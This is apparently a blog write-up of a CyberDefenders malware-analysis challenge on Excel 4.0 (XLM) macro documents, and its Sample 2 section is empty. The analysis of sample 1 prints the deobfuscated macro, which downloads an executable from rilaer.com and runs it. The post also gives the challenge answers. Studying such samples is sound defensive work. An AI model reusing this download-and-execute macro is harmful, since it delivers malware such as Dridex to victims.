---
layout:	post
title:  "XLM Macros"
date:   2025-11-04 02:11:01 +0200
image: /images/2025-11-04-XLM Macros/XLM_Macros.png
categories: [CyberDefenders, Malware Analysis]
tags: [cyberdefenders]
---

---

**Challenge Link:** [XLM Macros](https://cyberdefenders.org/blueteam-ctf-challenges/xlm-macros/)

<br>

## Scenario:

**Instructions**
- Uncompress the lab (pass: **cyberdefenders.org**)
- Zip sha256: 35fb4497de1633d6887fd1453ee1426ca627eeec
- Zip size: 74 KB

**Scenario**  
Recently, we have seen a resurgence of Excel-based malicous office documents. Howerver, instead of using VBA-style macros, they are using older style Excel 4 macros. This changes our approach to analyzing these documents, requiring a slightly different set of tools. In this challenge, you, as a security blue team analyst will get hands-on with two documents that use Excel 4.0 macros to perform anti-analysis and download the next stage of the attack.

**Samples**
- Sample1: MD5: fb5ed444ddc37d748639f624397cff2a
- Sample2: MD5: b5d469a07709b5ca6fee934b1e5e8e38

<br>

## Analysis:

### Sample 1

To begin the analysis, the challenge file `sample1-fb5ed444ddc37d748639f624397cff2a.bin` was examined with `file` command, where it was found to be a Microsoft Excel.

```bash
file sample1-fb5ed444ddc37d748639f624397cff2a.bin 
sample1-fb5ed444ddc37d748639f624397cff2a.bin: Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.2, Code page: 1252, Name of Creating Application: Microsoft Excel, Create Time/Date: Wed Apr  1 12:48:22 2020, Last Saved Time/Date: Thu Apr  2 13:21:34 2020, Security: 
```

Lets check if it contains any macros using `oleid`:

```bash
$ oleid sample1-fb5ed444ddc37d748639f624397cff2a.bin 

oleid 0.60.1 - http://decalage.info/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues

Filename: sample1-fb5ed444ddc37d748639f624397cff2a.bin
--------------------+--------------------+----------+--------------------------
Indicator           |Value               |Risk      |Description               
--------------------+--------------------+----------+--------------------------
File format         |MS Excel 97-2003    |info      |                          
                    |Workbook or Template|          |                          
--------------------+--------------------+----------+--------------------------
Container format    |OLE                 |info      |Container type            
--------------------+--------------------+----------+--------------------------
Application name    |Microsoft Excel     |info      |Application name declared 
                    |                    |          |in properties             
--------------------+--------------------+----------+--------------------------
Properties code page|1252: ANSI Latin 1; |info      |Code page used for        
                    |Western European    |          |properties                
                    |(Windows)           |          |                          
--------------------+--------------------+----------+--------------------------
Encrypted           |True                |low       |The file is encrypted. It 
                    |                    |          |may be decrypted with     
                    |                    |          |msoffcrypto-tool          
--------------------+--------------------+----------+--------------------------
VBA Macros          |No                  |none      |This file does not contain
                    |                    |          |VBA macros.               
--------------------+--------------------+----------+--------------------------
XLM Macros          |Yes                 |Medium    |This file contains XLM    
                    |                    |          |macros. Use olevba to     
                    |                    |          |analyse them.             
--------------------+--------------------+----------+--------------------------
External            |0                   |none      |External relationships    
Relationships       |                    |          |such as remote templates, 
                    |                    |          |remote OLE objects, etc   
--------------------+--------------------+----------+--------------------------
```

The above output revealed that the workbook is encrypted and contains XLM macro. We will get back to encryption part during decoding.

Lets look more into this document under `LibreOffice`:

![Visible Sheets](/images/2025-11-04-XLM-Macros/1.png)

Three visible sheets can be seen above. However, threat actors normally hide the malicious sheets to prevent immediate discovery. Lets check for hidden sheet by navigating to:
`Right click on Sheet tab => Show Sheet...`

![Hidden Sheets](/images/2025-11-04-XLM-Macros/2.png)

It revealed six hidden sheets: `SOCWNEScLLxkLhtJp`, `OHqYbvYcqmWjJJjsF`, `Macro2`, `Macro3`, `Macro4` and `Macro5`.

Upon checking one of the hidden sheet, following can be seen:

![Hidden Sheet](/images/2025-11-04-XLM-Macros/3.png)

The sheet contains instructions in different cells, where values in one cell reference and execute values from another cell and so on. This creates cell-based command chaining making it obfuscated. 

Lets try to decode it. From the `oleid` output, we know the workbook is encrypted. Although `olevba` tool can analyze encrypted document without requiring decryption, but the `xlmdeobfuscator` tool require decrypting the workbook.

Lets decrypt this document using `msoffcrypto-crack` by brute forcing.

```bash
$ msoffcrypto-crack.py sample1-fb5ed444ddc37d748639f624397cff2a.bin 

Password found: VelvetSweatshop
```

The password was found to be `VelvetSweatshop`. The document was then decrypted using `msoffcrypto-tool` and saved as `sample1.bin`.

```bash
$ msoffcrypto-tool -p VelvetSweatshop sample1-fb5ed444ddc37d748639f624397cff2a.bin sample1.bin
```

The decrypted file `sample1.bin` was then processed using `xlmdeobfuscator`: 

```bash
xlmdeobfuscator -f sample1.bin 
```

Alternatively, `olevba` can be used directly on the encrypted file `sample1-fb5ed444ddc37d748639f624397cff2a.bin`:

```bash
$ olevba sample1-fb5ed444ddc37d748639f624397cff2a.bin
```

Regardless of the technique followed, both tool dump the same de-obfuscated macro content, as shown below:

```bash
' CELL:DW1337    , FullEvaluation      , CALL("Kernel32","CreateDirectoryA","JCJ","C:\jhbtqNj\IOKVYnJ",0)
' CELL:DW1338    , FullEvaluation      , CALL("URLMON","URLDownloadToFileA","JJCCJJ",0,"http://rilaer.com/IfAmGZIJjbwzvKNTxSPM/ixcxmzcvqi.exRUN(SOCWNEScLLxkLhtJp!DW1337)","C:\jhbtqNj\IOKVYnJ\KUdYCRk.exe",0,0)
' CELL:DW1339    , FullEvaluation      , CALL("Shell32","ShellExecuteA","JJCCCCJ",0,"Open","C:\jhbtqNj\IOKVYnJ\KUdYCRk.exe",,0,0)
' CELL:DW1340    , End                 , HALT()
```

- It creates a new directory `C:\jhbtqNj\IOKVYnJ` via `CreateDirectoryA`.
- It calls `URLDownloadToFileA` to download next stager from `http://rilaer.com/IfAmGZIJjbwzvKNTxSPM/ixcxmzcvqi.exRUN(...)` and saves it as `KUdYCRk.exe` in the created directory. It then executes the next stager by calling `ShellExecuteA`.

<br>

### Sample 2


<br>

## Questions:

**Sample1: What is the document decryption password?**
<details>
  <summary>Show Answer</summary>
  <code>VelvetSweatshop</code>
</details>

<br>

**Sample1: This document contains six hidden sheets. What are their names? Provide the value of the one starting with S.**
<details>
  <summary>Show Answer</summary>
  <code>SOCWNEScLLxkLhtJp</code>
</details>

<br>

**Sample1: What URL is the malware using to download the next stage? Only include the second-level and top-level domain. For example, xyz.com.**
<details>
  <summary>Show Answer</summary>
  <code>http://rilaer.com</code>
</details>

<br>

**Sample1: What malware family was this document attempting to drop?**
<details>
  <summary>Show Answer</summary>
  <code>dridex</code>
  <br>
  Found signature in <a href="https://bazaar.abuse.ch/sample/7103c9d1c2a64b80a4b69e3d91487b602fd4ede836722fa9c0daf4fe09a2b7cd/">Malware Bazaar</a> via Google dorking the IoC: <code>intext:"rilaer.com/IfAmGZIJjbwzvKNTxSPM/ixcxmzcvqi</code>
</details>

<br>

---